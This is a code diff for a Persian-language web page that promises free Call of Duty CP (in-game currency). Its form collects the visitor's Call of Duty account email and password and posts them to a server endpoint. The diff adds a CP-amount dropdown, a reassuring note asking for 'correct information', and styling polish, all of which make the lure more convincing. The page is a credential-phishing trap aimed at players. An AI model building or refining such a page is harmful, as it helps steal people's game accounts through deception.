@@ -5,7 +5,10 @@
   <title>دریافت رایگان CP کالاف دیوتی</title>
   <style>
     body {
-      background: url('https://wallpapercave.com/wp/wp7373575.jpg') no-repeat center center fixed;
+      background-color: #000;
+      background-image: url('https://wallpapercave.com/wp/wp7373575.jpg');
+      background-repeat: no-repeat;
+      background-position: center;
       background-size: cover;
       font-family: 'Vazir', sans-serif;
       display: flex;
@@ -13,55 +16,77 @@
       align-items: center;
       height: 100vh;
       margin: 0;
+      color: white;
     }
     .container {
-      background: rgba(0, 0, 0, 0.7);
-      padding: 30px;
+      background: rgba(0, 0, 0, 0.85);
+      padding: 40px 30px;
       border-radius: 20px;
       text-align: center;
-      color: white;
-      box-shadow: 0 0 15px #00ffcc;
+      box-shadow: 0 0 30px #00ffcc, 0 0 20px #0055ff;
       width: 90%;
-      max-width: 400px;
+      max-width: 450px;
     }
     h1 {
       margin-bottom: 20px;
-      font-size: 28px;
+      font-size: 30px;
       color: #00ffcc;
+      text-shadow: 0 0 5px #00ffcc;
     }
-    input {
+    input, select {
       width: 90%;
-      padding: 10px;
-      margin: 10px 0;
+      padding: 12px;
+      margin: 12px 0;
       border: none;
       border-radius: 10px;
       font-size: 16px;
+      background: #222;
+      color: white;
     }
     button {
       margin-top: 20px;
-      padding: 12px 20px;
+      padding: 14px 22px;
       background-color: #00ffcc;
       border: none;
       border-radius: 10px;
       font-size: 18px;
       color: black;
       cursor: pointer;
-      transition: background 0.3s;
+      transition: background 0.3s, transform 0.3s;
     }
     button:hover {
       background-color: #00ccaa;
+      transform: scale(1.05);
+    }
+    .note {
+      font-size: 14px;
+      margin-top: 20px;
+      color: #aaa;
     }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <h1>سی‌پی رایگان کالاف دیوتی</h1>
+    <h1>دریافت رایگان CP کالاف دیوتی</h1>
     <form action="your-server-endpoint" method="POST">
       <input type="email" name="email" placeholder="ایمیل کالاف دیوتی" required><br>
       <input type="password" name="password" placeholder="رمز عبور اکانت" required><br>
+      
+      <select name="cp_amount" required>
+        <option value="">مقدار CP را انتخاب کنید</option>
+        <option value="500">500 CP</option>
+        <option value="1000">1000 CP</option>
+        <option value="2400">2400 CP</option>
+        <option value="5000">5000 CP</option>
+      </select><br>
+
       <button type="submit">دریافت CP</button>
     </form>
+
+    <div class="note">
+      توجه: لطفا اطلاعات صحیح وارد کنید تا CP به درستی واریز شود.
+    </div>
   </div>
 
 </body>
